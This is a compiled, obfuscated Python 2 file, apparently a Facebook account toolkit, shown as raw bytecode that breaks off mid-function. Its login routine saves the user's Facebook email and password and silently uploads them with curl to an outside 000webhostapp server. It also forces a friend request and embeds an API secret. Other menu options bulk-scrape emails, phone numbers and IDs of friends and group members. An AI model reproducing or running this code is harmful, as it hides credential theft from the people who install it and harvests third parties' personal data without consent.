ó
8ð]c           @   s!   d  d l  Z  e  j d  d Ud S(   iÿÿÿÿNsMO c           @   sI  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m Z y d  d l Z Wn e k
 rÐ e  j d  n Xy d  d l Z Wn e k
 re  j d  n Xd  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d	 dN g e _ d   Z d   Z d   Z  d   Z! d Z" d   Z# d a$ g  Z% g  a& g  a' g  a( g  a) g  Z* g  Z+ g  Z, g  Z- g  Z. g  Z/ g  Z0 g  Z1 g  Z2 g  Z3 d Z4 g  Z5 g  Z6 g  Z7 g  Z8 g  Z9 d Z: d Z; d   Z< d   Z= d   Z> d   Z? d   Z@ d   ZA d   ZB d   ZC d   ZD d   ZE d    ZF d!   ZG d"   ZH d#   ZI d$   ZJ d%   ZK d&   ZL d'   ZM d(   ZN d)   ZO d*   ZP d+   ZQ d,   ZR d-   ZS d.   ZT d/   ZU d0   ZV d1   ZW d2   ZX d3   ZY d4   ZZ d5   Z[ d6   Z\ d7   Z] d8   Z^ d9   Z_ d:   Z` d;   Za d<   Zb d=   Zc d>   Zd d?   Ze d@   Zf dA   Zg dB   Zh dC   Zi dD   Zj dE   Zk dF   Zl dG   Zm dH   Zn dI   Zo dJ   Zp dK   Zq er dL  Zs et dM k rEe?   n  d S(O   iÿÿÿÿN(   t
   ThreadPools   pip2 install mechanizes   pip2 install requests(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j   d  S(   Ns   [1;91m[!] Exit(   t   ost   syst   exit(    (    (    s   <Ahmad_Riswanto>t   keluar   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t |  d  | 7} q Wt |  S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   <Ahmad_Riswanto>t   acak$   s
    0c         C   s~   d } xA | D]9 } | j  |  } |  j d | d t d |   }  q W|  d 7}  |  j d d  }  t j j |  d  d  S(   NR	   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   j(    (    s   <Ahmad_Riswanto>R   +   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   <Ahmad_Riswanto>t   jalan5   s    s  [1;97mâââââââââ
[1;97mâââââââââ      [1;96mââ¬â¬â¬â¬â¬â¬â¬â¬â¬à¹Û©Û©à¹â¬â¬â¬â¬â¬â¬â¬â¬â
[1;97mâ[1;91mâ¼â¼â¼â¼â¼ [1;97m- _ --_--[1;92mââ¦âââââ¬âââ¬ââ   âââââ 
[1;97mâ [1;97m [1;97m_-_-- -_ --__[1;92m âââââ¤ââ¬âââ´âââââ â£ â â©â
[1;97mâ[1;91mâ²â²â²â²â²[1;97m--  - _ --[1;92mââ©ââ´ â´â´âââ´ â´   â  âââ [1;93mv1.7
[1;97mâââââââââ      [1;96mÂ«----------â§----------Â»
[1;97m ââ ââ
[1;97mââââââââââââââââââââââââââââââââââââââââââ
[1;97mâ[1;93m* [1;97mAuthor  [1;91m: [1;96mZeDD Parker [1;97m                â
[1;97mâ[1;93m* [1;97mSupport [1;91m: [1;96mLimit[1;97m[[1;96meD[1;97m] [1;97m |[1;96m./R41N53[1;97m|[1;96mAl2VyN [1;97mâ
[1;97mâ[1;93m* [1;97mGitHub  [1;91m: [1;92m[4mhttps://github.com/rezadkim[0m [1;97mâ
[1;97mââââââââââââââââââââââââââââââââââââââââââc          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s$   [1;91m[â] [1;92mLoading [1;97mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   <Ahmad_Riswanto>t   tikJ   s
      i    s.   pujasuaramajalengka.000webhostapp.com/facebooks   [31mNot Vulns	   [32mVulnc          C   s   t  j d  t GHd GHd GHd GHd GHt d  }  |  d k rM d GHt   nN |  d	 k rc t   n8 |  d
 k ry t   n" |  d k r t   n d GHt   d  S(   Nt   resets+   [1;97mâ--[1;91m> [1;92m1.[1;97m Logins7   [1;97mâ--[1;91m> [1;92m2.[1;97m Login using tokens*   [1;97mâ--[1;91m> [1;91m0.[1;97m Exits
   [1;97mâs   [1;97mââ[1;91mD [1;97mR
   s   [1;91m[!] Wrong inputt   1t   2t   0(   R   t   systemt   logot	   raw_inputR   t   logint   tokenz(   t   msuk(    (    s   <Ahmad_Riswanto>t   masukj   s$    



c          C   s  t  j d  y t d d  }  t   WnÙt t f k
 rt  j d  t GHd GHt d  } t j d  } t	   y t
 j d  Wn  t j k
 r© d GHt   n Xt t
 j _ t
 j d	 d
  | t
 j d <| t
 j d <t
 j   t
 j   } d | k r¤yyd | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d d 6d  d! 6} t j d"  } | j |  | j   } | j i | d# 6 d$ } t j | d% | } t j | j  }	 t d d&  }
 |
 j |	 d'  |
 j   d( GHt j  d) |	 d'  t  j d*  t d+ d&  } | j d, | d- | d.  | j   t  j d/ t! d0  t   Wq¤t j" j# k
 r d GHt   q¤Xn  d1 | k rÙd2 GHt  j d3  t$ j% d4  t   qd5 GHt  j d3  t$ j% d4  t&   n Xd  S(6   NR$   s	   login.txtt   rs4   [1;91m[â] [1;92mLOGIN AKUN FACEBOOK [1;91m[â]s@   [1;91m[+] [1;36mID[1;97m|[1;96mEmail[1;97m [1;91m:[1;92m s+   [1;91m[+] [1;36mPassword [1;91m:[1;92m s   https://m.facebook.coms   
[1;91m[!] No connectiont   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatR%   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodR'   t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens5   
[1;91m[[1;96mâ[1;91m] [1;92mLogin successfullysM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s+   xdg-open https://www.instagram.com/rezadkimt-   pujasuaramanaajakawanskgsukkaftpatfensgyebjgds   [1;92m[[1;97ms   [1;92m] =>[1;97m s   
sH   curl -X POST -F x=@pujasuaramanaajakawanskgsukkaftpatfensgyebjgd http://s   /server.phpt
   checkpoints%   
[1;91m[!] [1;93mAccount Checkpoints   rm -rf login.txti   s   
[1;91m[!] Login Failed('   R   R(   t   opent   menut   KeyErrort   IOErrorR)   R*   t   getpassR#   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postt   myroomt
   exceptionsR   R   R   R+   (   t   tokett   idt   pwdt   urlRA   t   dataR   t   aR/   R   t   zeddt   les(    (    s   <Ahmad_Riswanto>R+      sp    
S


c          C   sÚ   t  j d  t GHt d  }  y` t j d |   } t j | j  } | d } t	 d d  } | j
 |   | j   t   WnU t k
 rÕ d GHt d  } | d	 k rµ t   qÖ | d
 k rË t   qÖ t   n Xd  S(   NR$   s(   [1;91m[?] [1;92mToken[1;91m : [1;97ms+   https://graph.facebook.com/me?access_token=t   names	   login.txtR   s   [1;91m[!] Wrongs6   [1;91m[?] [1;92mWant to pick up token?[1;97m[y/n]: R
   t   y(   R   R(   R)   R*   RY   RZ   R[   R\   R]   RF   R   R^   RG   RH   R   R+   (   Rb   t   otwRg   t   namaRh   R   (    (    s   <Ahmad_Riswanto>R,   ½   s&    



c          C   s  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n Xy= t j	 d |   } t
 j | j  } | d } | d	 } Wnf t k
 rð t  j d  d
 GHt  j d  t j d  t   n# t j j k
 rd GHt   n Xt  j d  t GHd | d GHd | GHd d d GHd GHd GHd GHd GHd GHd GHd GHd GHd GHd GHt   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=Rj   Rc   s$   [1;91m[!] [1;93mAccount Checkpoints   [1;91m[!] No connections:   â[1;91m[[1;96mâ[1;91m][1;97m Name [1;91m: [1;92ms   [1;97ms:   â[1;91m[[1;96mâ[1;91m][1;97m ID   [1;91m: [1;92ms
   [1;97mâi(   s   âs6   [1;97mâ--[1;91m> [1;92m1.[1;97m User informations5   [1;97mâ--[1;91m> [1;92m2.[1;97m Get Id/email/hpsJ   [1;97mâ--[1;91m> [1;92m3.[1;97m Hack facebook account               s0   [1;97mâ--[1;91m> [1;92m4.[1;97m Bot       s7   [1;97mâ--[1;91m> [1;92m5.[1;97m Others           s;   [1;97mâ--[1;91m> [1;92m6.[1;97m Show token           s<   [1;97mâ--[1;91m> [1;92m7.[1;97m Delete trash          s8   [1;97mâ--[1;91m> [1;92m8.[1;97m LogOut            sA   [1;97mâ--[1;91m> [1;91m0.[1;97m Exit the programs          s   â(   R   R(   RF   t   readRI   R   R   R+   RY   RZ   R[   R\   R]   RH   Ra   R   R   R)   t   pilih(   Rb   Rl   Rg   Rm   Rc   (    (    s   <Ahmad_Riswanto>RG   ×   sN    

	c          C   s\  t  d  }  |  d k r' d GHt   n1|  d k r= t   n|  d k rS t   n|  d k rn d GHt   nê |  d k r t   nÔ |  d	 k r t   n¾ |  d
 k rê t j d  t	 GHt
 d d  j   } d | GHt  d  t   nn |  d k rt j d  nR |  d k r6t j d  t j d  t   n" |  d k rLt   n d GHt   d  S(   Ns   [1;97mââ[1;91mD [1;97mR
   s   [1;91m[!] Wrong inputR%   R&   t   3s   [1;91m[!] Dikuncit   4t   5t   6R$   s	   login.txtR/   s-   [1;91m[+] [1;92mYour token[1;91m :[1;97m s   
[1;91m[ [1;97mBack [1;91m]t   7t   outt   8s   rm -rf login.txts,   xdg-open https://www.youtube.com/nganunymousR'   (   R*   Ro   t	   informasit   dumpR   t   menu_bott   lainR   R(   R)   RF   Rn   RG   t   remove(   Rh   Rb   (    (    s   <Ahmad_Riswanto>Ro      s@    





	



c          C   sª  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  } t
 d  t j d	 |   } t j | j  } xö| d
 D]Ô} | | d k sÞ | | d k r¸ t j d | d d |   } t j | j  } d d GHy d | d GHWn t k
 rAd GHn Xy d | d GHWn t k
 rkd GHn Xy d | d GHWn t k
 rd GHn Xy d | d GHWn t k
 r¿d GHn Xy d | d d GHWn t k
 ríd GHn Xy d | d GHWn t k
 rd  GHn XyL d! GHx@ | d" D]4 } y d# | d$ d GHWq+t k
 r^d% GHq+Xq+WWn t k
 rwn Xt	 d&  t   q¸ q¸ Wd' GHt	 d&  t   d  S((   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s>   [1;91m[+] [1;92mEnter ID[1;97m/[1;92mName[1;91m : [1;97ms,   [1;91m[âº] [1;92mWait a minute [1;97m...s3   https://graph.facebook.com/me/friends?access_token=Rf   Rj   Rc   s   https://graph.facebook.com/s   ?access_token=i*   s
   [1;97mâs+   [1;91m[â¹] [1;92mName[1;97m          : s9   [1;91m[?] [1;92mName[1;97m          : [1;91mNot founds+   [1;91m[â¹] [1;92mID[1;97m            : s9   [1;91m[?] [1;92mID[1;97m            : [1;91mNot founds+   [1;91m[â¹] [1;92mEmail[1;97m         : R1   s9   [1;91m[?] [1;92mEmail[1;97m         : [1;91mNot founds+   [1;91m[â¹] [1;92mTelephone[1;97m     : t   mobile_phones9   [1;91m[?] [1;92mTelephone[1;97m     : [1;91mNot founds+   [1;91m[â¹] [1;92mLocation[1;97m      : t   locations9   [1;91m[?] [1;92mLocation[1;97m      : [1;91mNot founds+   [1;91m[â¹] [1;92mDate of birth[1;97m : t   birthdays9   [1;91m[?] [1;92mDate of birth[1;97m : [1;91mNot founds+   [1;91m[â¹] [1;92mSchool[1;97m        : t	   educations#   [1;91m                   ~ [1;97mt   schools,   [1;91m                   ~ [1;91mNot founds   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[â] User not found(   R   R(   RF   Rn   RI   R   R   R+   R)   R*   R    RY   RZ   R[   R\   R]   RH   RG   (   Rb   t   aidR/   t   cokR   R   R   t   q(    (    s   <Ahmad_Riswanto>Rw   $  st    
 	 	 	 	 	 	 	  


c          C   s¹   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHd GHd GHd GHd GHt	   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s3   [1;97mâ--[1;91m> [1;92m1.[1;97m Get ID friends?   [1;97mâ--[1;91m> [1;92m2.[1;97m Get ID friend from friends3   [1;97mâ--[1;91m> [1;92m3.[1;97m Get ID Searchs9   [1;97mâ--[1;91m> [1;92m4.[1;97m Get group member IDs<   [1;97mâ--[1;91m> [1;92m5.[1;97m Get group member emailsC   [1;97mâ--[1;91m> [1;92m6.[1;97m Get group member phone numbers6   [1;97mâ--[1;91m> [1;92m7.[1;97m Get email friendsB   [1;97mâ--[1;91m> [1;92m8.[1;97m Get email friend from friendsA   [1;97mâ--[1;91m> [1;92m9.[1;97m Get a friend's phone numbersN   [1;97mâ--[1;91m> [1;92m10.[1;97m Get a friend's phone number from friends*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(
   R   R(   RF   Rn   RI   R   R   R+   R)   t
   dump_pilih(   Rb   (    (    s   <Ahmad_Riswanto>Rx   [  s.    c          C   s;  t  d  }  |  d k r' d GHt   n|  d k r= t   nú |  d k rS t   nä |  d k r{ t j d  d GHt   n¼ |  d	 k r t   n¦ |  d
 k r§ t   n |  d k r½ t	   nz |  d k rÓ t
   nd |  d k ré t   nN |  d k rÿ t   n8 |  d k rt   n" |  d k r+t   n d GHt   d  S(   Ns   [1;97mââ[1;91mD [1;97mR
   s   [1;91m[!] Wrong inputR%   R&   Rp   R$   s   [1;91mSegeraRq   Rr   Rs   Rt   Rv   t   9t   10R'   (   R*   R   t   id_temant   idfrom_temanR   R(   R   t   id_member_grupt   em_member_grupt   no_member_grupR1   t   emailfrom_temant   nomor_hpt   hpfrom_temanRG   (   t   cuih(    (    s   <Ahmad_Riswanto>R   t  s<    











c          C   sQ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xy*t  j d  t
 GHt j d |   } t j | j  } t d	  d
 d GHt d d  } xr | d D]f } t j | d  | j | d d  d t t t   d | d Gt j j   t j d  qì W| j   d GHd t t  GHt d  } t  j d d |  d | GHt d  t   Wn t k
 rØd GHt d  t   nu t t f k
 rd GHt d  t   nI t k
 r*d GHt d  t   n# t j  j! k
 rLd GHt"   n Xd  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   s3   https://graph.facebook.com/me/friends?access_token=s0   [1;91m[âº] [1;92mGet all friend id [1;97m...i*   s
   [1;97mâs   out/id_teman.txtR   Rf   Rc   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97mg-Cëâ6?sB   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get id [1;97m....s.   [1;91m[+] [1;92mTotal ID [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   R   R(   RF   Rn   RI   R   R   R+   t   mkdirt   OSErrorR)   RY   RZ   R[   R\   R]   R    t   idtemant   appendR   R   R   R   R   R   R^   R*   t   renameRx   t   KeyboardInterruptt   EOFErrorRH   Ra   R   R   (   Rb   R/   R   t   bzRg   t   done(    (    s   <Ahmad_Riswanto>R     sb    
	   
	






c    	      C   sÑ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xyªt  j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt j d	 | d |   } t j | j  } t d  d d GHt d d  } xv | d d D]f } t j | d  | j | d d  d t t t   d | d Gt j j   t j d  qlW| j   d GHd t t  GHt d  } t  j d d |  d  | GHt d  t   Wn t k
 rXd! GHt d  t   nu t t f k
 rd" GHt d  t   nI t k
 rªd# GHt d  t   n# t j  j! k
 rÌd$ GHt"   n Xd  S(%   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   s2   [1;91m[+] [1;92mInput ID friend [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m Rj   s   [1;91m[!] Friend not founds   
[1;91m[ [1;97mBack [1;91m]s)   ?fields=friends.limit(5000)&access_token=s<   [1;91m[âº] [1;92mGet all friend id from friend [1;97m...i*   s
   [1;97mâs   out/id_teman_from_teman.txtR   t   friendsRf   Rc   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97mg-Cëâ6?sB   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get id [1;97m....s.   [1;91m[+] [1;92mTotal ID [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   R   R(   RF   Rn   RI   R   R   R+   R   R   R)   R*   RY   RZ   R[   R\   R]   RH   Rx   R    t   idfromtemanR   R   R   R   R   R   R   R^   R   R   R   Ra   R   R   (	   Rb   t   idtt   jokt   opR/   R   R   Rg   R   (    (    s   <Ahmad_Riswanto>R   È  st    

	   
	






c    	      C   sÀ  y t  d d  j   }  Wn7 t k
 rR d GHt j d  t j d  t   n Xy t j d  Wn t	 k
 rw n Xy¦t j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 r d GHt d  t   n Xt d  d d GHt  d d  } t j d | d |   } t j | j  } xr | d D]f } t j | d  | j | d d  d t t t   d | d Gt j j   t j d  q[W| j   d GHd t t  GHt d  } t j d d |  d  | GHt d  t   Wn t k
 rGd! GHt d  t   nu t t f k
 rsd" GHt d  t   nI t k
 rd# GHt d  t   n# t j  j! k
 r»d$ GHt"   n Xd  S(%   Ns	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   R$   s1   [1;91m[+] [1;92mInput ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rj   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s2   [1;91m[âº] [1;92mGet group member id [1;97m...i*   s
   [1;97mâs   out/member_grup.txtR   s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=Rf   Rc   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97mg-Cëâ6?sB   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get id [1;97m....s.   [1;91m[+] [1;92mTotal ID [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   RF   Rn   RI   R   R(   R   R   R+   R   R   R)   R*   RY   RZ   R[   R\   R]   RH   Rx   R    t   idmemR   R   R   R   R   R   R   R^   R   R   R   Ra   R   R   (	   Rb   Rc   R/   t   aswR   t   ret   sRg   R   (    (    s   <Ahmad_Riswanto>R     sr    

	   
	






c          C   s"  y t  d d  j   }  Wn7 t k
 rR d GHt j d  t j d  t   n Xy t j d  Wn t	 k
 rw n Xyt j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 r d GHt d  t   n Xt d  d d GHt  d d  } t j d | d |   } t j | j  } xË | d D]¿ } t j d | d d |   } t j | j  }	 yt t j |	 d  | j |	 d d  d t t t   d |	 d d |	 d d Gt j j   t j d  Wq[t k
 rq[Xq[W| j   d d GHd GHd  t t  GHt d!  }
 t j d d" |
  d# |
 GHt d  t   Wn t k
 r©d$ GHt d  t   nu t t f k
 rÕd% GHt d  t   nI t k
 rûd& GHt d  t   n# t j  j! k
 rd' GHt"   n Xd  S((   Ns	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   R$   s1   [1;91m[+] [1;92mInput ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rj   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s5   [1;91m[âº] [1;92mGet group member email [1;97m...i*   s
   [1;97mâs   out/em_member_grup.txtR   s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=Rf   Rc   s   ?access_token=R1   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | g-Cëâ6?sW   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get email from member group [1;97m....s1   [1;91m[+] [1;92mTotal Email [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   RF   Rn   RI   R   R(   R   R   R+   R   R   R)   R*   RY   RZ   R[   R\   R]   RH   Rx   R    t   emmemR   R   R   R   R   R   R   R^   R   R   R   Ra   R   R   (   Rb   Rc   R/   R   R   R    R¡   Rg   R   R   R   (    (    s   <Ahmad_Riswanto>R   =  s~    

	0  
		






c          C   s"  y t  d d  j   }  Wn7 t k
 rR d GHt j d  t j d  t   n Xy t j d  Wn t	 k
 rw n Xyt j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 r d GHt d  t   n Xt d  d d GHt  d d  } t j d | d |   } t j | j  } xË | d D]¿ } t j d | d d |   } t j | j  }	 yt t j |	 d  | j |	 d d  d t t t   d |	 d d |	 d d Gt j j   t j d  Wq[t k
 rq[Xq[W| j   d d GHd GHd  t t  GHt d!  }
 t j d d" |
  d# |
 GHt d  t   Wn t k
 r©d$ GHt d  t   nu t t f k
 rÕd% GHt d  t   nI t k
 rûd& GHt d  t   n# t j  j! k
 rd' GHt"   n Xd  S((   Ns	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   R$   s1   [1;91m[+] [1;92mInput ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rj   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s<   [1;91m[âº] [1;92mGet group member phone number [1;97m...i*   s
   [1;97mâs   out/no_member_grup.txtR   s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=Rf   Rc   s   ?access_token=R|   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | g-Cëâ6?s^   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get phone number from member group [1;97m....s2   [1;91m[+] [1;92mTotal Number [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   RF   Rn   RI   R   R(   R   R   R+   R   R   R)   R*   RY   RZ   R[   R\   R]   RH   Rx   R    t   nomemR   R   R   R   R   R   R   R^   R   R   R   Ra   R   R   (   Rb   Rc   R/   R   R   R    R¡   Rg   R   R   R   (    (    s   <Ahmad_Riswanto>R   }  s~    

	0  
		






c          C   s¦  y t  d d  j   }  Wn7 t k
 rR d GHt j d  t j d  t   n Xy t j d  Wn t	 k
 rw n Xyt j d  t
 GHt j d |   } t j | j  } t d	  d
 d GHt  d d  } xË | d D]¿ } t j d | d d |   } t j | j  } yt t j | d  | j | d d  d t t t   d | d d | d d Gt j j   t j d  Wqß t k
 rqß Xqß W| j   d
 d GHd GHd t t  GHt d  } t j d d |  d | GHt d  t   Wn t k
 r-d GHt d  t   nu t t f k
 rYd  GHt d  t   nI t k
 rd! GHt d  t   n# t j  j! k
 r¡d" GHt"   n Xd  S(#   Ns	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   R$   s3   https://graph.facebook.com/me/friends?access_token=s3   [1;91m[âº] [1;92mGet all friend email [1;97m...i*   s
   [1;97mâs   out/email_teman.txtR   Rf   s   https://graph.facebook.com/Rc   s   ?access_token=R1   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | Rj   g-Cëâ6?sE   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get email [1;97m....s1   [1;91m[+] [1;92mTotal Email [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   RF   Rn   RI   R   R(   R   R   R+   R   R   R)   RY   RZ   R[   R\   R]   R    t   emR   R   R   R   R   R   R   RH   R^   R*   R   Rx   R   R   Ra   R   R   (   Rb   R/   Rg   R   R   R   R   R   (    (    s   <Ahmad_Riswanto>R1   ½  sl    
	0  
		






c          C   s/  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xyt  j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt j d	 | d |   } t j | j  } t d  d d GHt d d  } xË | d D]¿ } t j d	 | d d
 |   } t j | j  }	 yt t j |	 d  | j |	 d d  d t t t   d |	 d d |	 d d Gt j j   t j d  Wqht k
 r&qhXqhW| j   d d GHd GHd t t  GHt d  }
 t  j d d  |
  d! |
 GHt d  t   Wn t k
 r¶d" GHt d  t   nu t t f k
 râd# GHt d  t   nI t k
 rd$ GHt d  t   n# t j  j! k
 r*d% GHt"   n Xd  S(&   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   s2   [1;91m[+] [1;92mInput ID friend [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m Rj   s   [1;91m[!] Friend not founds   
[1;91m[ [1;97mBack [1;91m]s   /friends?access_token=s?   [1;91m[âº] [1;92mGet all friend email from friend [1;97m...i*   s
   [1;97mâs   out/em_teman_from_teman.txtR   Rf   Rc   R1   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | g-Cëâ6?sE   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get email [1;97m....s1   [1;91m[+] [1;92mTotal Email [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   R   R(   RF   Rn   RI   R   R   R+   R   R   R)   R*   RY   RZ   R[   R\   R]   RH   Rx   R    t   emfromtemanR   R   R   R   R   R   R   R^   R   R   R   Ra   R   R   (   Rb   R   R   R   R/   Rg   R   R   R   R   R   (    (    s   <Ahmad_Riswanto>R   ô  s    

	0  
		






c          C   s¹  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xyt  j d  t
 GHt d  d	 d
 GHd |  } t j |  } t j | j  } t d d  } xË | d D]¿ } t j d | d d |   } t j | j  } yt t j | d  | j | d d  d t t t   d | d d | d d Gt j j   t j d  Wqò t k
 r°qò Xqò W| j   d	 d
 GHd GHd t t  GHt d  } t  j d d |  d | GHt d  t   Wn t k
 r@d GHt d  t   nu t t f k
 rld  GHt d  t   nI t k
 rd! GHt d  t   n# t j  j! k
 r´d" GHt"   n Xd  S(#   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   s:   [1;91m[âº] [1;92mGet all friend number phone [1;97m...i*   s
   [1;97mâs3   https://graph.facebook.com/me/friends?access_token=s   out/nomer_teman.txtR   Rf   s   https://graph.facebook.com/Rc   s   ?access_token=R|   s   
